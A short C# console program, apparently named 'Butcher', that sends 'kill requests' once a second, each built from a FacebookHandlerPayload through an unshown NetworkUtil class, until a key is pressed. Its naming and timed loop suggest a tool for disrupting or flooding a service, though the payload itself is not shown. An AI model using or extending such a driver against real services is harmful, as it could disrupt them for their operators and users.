using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Threading;

namespace Butcher
{
	class Program
	{
		static void Main(string[] args)
		{
			Console.Write("Sending kill requests, press any key to stop.");
			var timer = new System.Timers.Timer();
			timer.Elapsed += new System.Timers.ElapsedEventHandler(timer_Elapsed);
			timer.Interval = 1000;
			timer.Enabled = true;

			Console.ReadKey();
		}

		static void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
			NetworkUtil.Instance.SendRequest(new FacebookHandlerPayload());
			Console.Write(".");
		}
	}
}
